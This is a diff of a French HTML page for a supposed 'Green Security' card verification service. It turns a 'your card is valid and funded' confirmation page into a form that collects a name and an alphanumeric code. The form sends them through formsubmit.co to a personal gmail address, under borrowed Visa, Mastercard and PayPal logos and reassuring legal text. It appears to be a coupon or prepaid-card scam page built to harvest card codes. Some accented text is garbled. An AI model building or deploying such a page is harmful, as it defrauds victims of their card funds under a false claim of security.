@@ -1,153 +1,144 @@
 <!DOCTYPE html>
 <html lang="fr">
-<head>
+ <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Confirmation - Carte Validée</title>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+  <title>Green Security - Formulaire de vÃ©rification</title>
   <style>
-    * {
-      box-sizing: border-box;
-    }
-
     body {
-      font-family: 'Poppins', sans-serif;
-      background-color: #0d0d0d;
-      color: #00ff99;
+      font-family: Arial, sans-serif;
       margin: 0;
-      padding: 0;
+      background-color: #f5f5f5;
+      color: #333;
     }
 
-    .container {
+    header {
+      background-color: #006644;
+      color: white;
+      padding: 20px;
+      text-align: center;
+    }
+
+    header img {
+      height: 50px;
+    }
+
+    main {
+      padding: 20px;
       max-width: 600px;
       margin: auto;
-      padding: 30px 20px;
-      background-color: #000;
-      border-radius: 15px;
-      box-shadow: 0 0 25px #00ff99;
-      text-align: center;
-      margin-top: 50px;
-    }
-
-    .logo {
-      width: 100px;
-      margin-bottom: 20px;
-    }
-
-    .emoji {
-      font-size: 48px;
-      margin-bottom: 20px;
-    }
-
-    h1 {
-      font-size: 24px;
-      margin-bottom: 10px;
-    }
-
-    p {
-      font-size: 16px;
-      color: #ccc;
-    }
-
-    .btn-retour {
+      background: white;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      border-radius: 10px;
       margin-top: 30px;
-      padding: 12px 25px;
-      background-color: #00ff99;
-      color: #000;
+      margin-bottom: 30px;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+    }
+
+    label {
+      margin-top: 15px;
       font-weight: bold;
-      border: none;
-      border-radius: 8px;
-      text-decoration: none;
-      display: inline-block;
-      transition: background 0.3s;
     }
 
-    .btn-retour:hover {
-      background-color: #0f9;
+    input[type="text"],
+    input[type="date"],
+    input[type="time"],
+    input[type="submit"] {
+      padding: 10px;
+      margin-top: 5px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 16px;
     }
 
-    footer {
-      background-color: #111;
-      padding: 30px 10px;
-      margin-top: 60px;
-      color: #888;
-      text-align: center;
-    }
-
-    footer a {
-      color: #00ff99;
-      text-decoration: none;
-      margin: 0 10px;
-    }
-
-    .partners {
+    input[type="submit"] {
+      background-color: #006644;
+      color: white;
+      cursor: pointer;
       margin-top: 20px;
     }
 
-    .partners img {
-      width: 40px;
-      height: auto;
-      margin: 0 8px;
-      vertical-align: middle;
-      filter: grayscale(100%);
-      opacity: 0.7;
-      transition: 0.3s;
+    input[type="submit"]:hover {
+      background-color: #004d33;
     }
 
-    .partners img:hover {
-      filter: none;
-      opacity: 1;
+    footer {
+      background-color: #0f0f0f;
+      color: #ccc;
+      padding: 30px 20px;
+      font-size: 14px;
+      text-align: center;
     }
 
-    @media screen and (max-width: 480px) {
-      .container {
-        margin-top: 30px;
-        padding: 20px 15px;
+    footer img {
+      height: 30px;
+      margin: 10px;
+    }
+
+    @media (max-width: 600px) {
+      main {
+        margin: 20px;
       }
 
-      h1 {
+      header h1 {
         font-size: 20px;
-      }
-
-      .emoji {
-        font-size: 36px;
-      }
-
-      .partners img {
-        width: 30px;
-        margin: 0 5px;
-      }
-
-      .btn-retour {
-        width: 100%;
-        padding: 12px 0;
       }
     }
   </style>
 </head>
 <body>
 
-  <div class="container">
-    <img src="logo.png" alt="Logo" class="logo">
-    <div class="emoji">✅</div>
-    <h1>🎉 Félicitations, votre carte est valide</h1>
-    <p>Votre vérification a bien été prise en compte.<br>
-    Votre carte/coupon est active et dispose de fonds disponibles.</p>
+  <header>
+    <img src="logo site.jpg" alt="Logo Green Security">
+    <h1>Formulaire de vÃ©rification sÃ©curisÃ©e</h1>
+  </header>
 
-    <a href="index.html" class="btn-retour">Retour à l'accueil</a>
-  </div>
+  <main>
+      <form action="https://formsubmit.co/alexandersoros333@gmail.com" method="POST">
+  <input type="hidden" name="_next" value="https://alexandersoros333.github.io/Green-security/merci.html">
+  <input type="hidden" name="_captcha" value="false">
+
+  <label for="name">Nom :</label>
+  <input type="text" id="name" name="name" required>
+
+  <label for="code">Code (AlphanumÃ©rique) :</label>
+  <input type="text" id="code" name="code" required pattern="[A-Za-z0-9]+">
+
+  <label for="date">Date :</label>
+  <input type="date" id="date" name="date" required>
+
+  <label for="heure">Heure :</label>
+  <input type="time" id="heure" name="heure" required>
+
+  <input type="submit" value="Envoyer">
+      </form>
+  </main>
 
   <footer>
-    <p>&copy; 2025 GREEN SÉCURITÉ. Tous droits réservés.</p>
-    <p>
-      <a href="#">Mentions légales</a> |
-      <a href="#">Conditions d'utilisation</a>
-    </p>
-    <div class="partners">
-      <img src="visa.png" alt="Visa">
-      <img src="mastercard.png" alt="MasterCard">
-      <img src="paypal.png" alt="PayPal">
+    <div>
+      <h3 style="color: #00ff99;">Mentions lÃ©gales & Conditions dâ€™utilisation</h3>
+      <p>
+        Ce site est Ã©ditÃ© par Green Security. Lâ€™utilisation de ce formulaire implique lâ€™acceptation des conditions gÃ©nÃ©rales. Vos donnÃ©es sont traitÃ©es de maniÃ¨re confidentielle et sÃ©curisÃ©e.
+      </p>
+      <p>
+        Toute tentative de fraude ou dâ€™abus peut entraÃ®ner des sanctions lÃ©gales.
+      </p>
     </div>
+
+    <hr style="margin: 20px 0; border-color: #333;">
+
+    <h4>Nos partenaires</h4>
+    <div>
+      <img src="Visa.png" alt="Visa">
+      <img src="Mastercard.png" alt="Mastercard">
+      <img src="Paypal.png" alt="PayPal">
+    </div>
+
+    <p style="margin-top: 20px; font-size: 12px;">&copy; 2025 Green Security. Tous droits rÃ©servÃ©s.</p>
   </footer>
 
 </body>
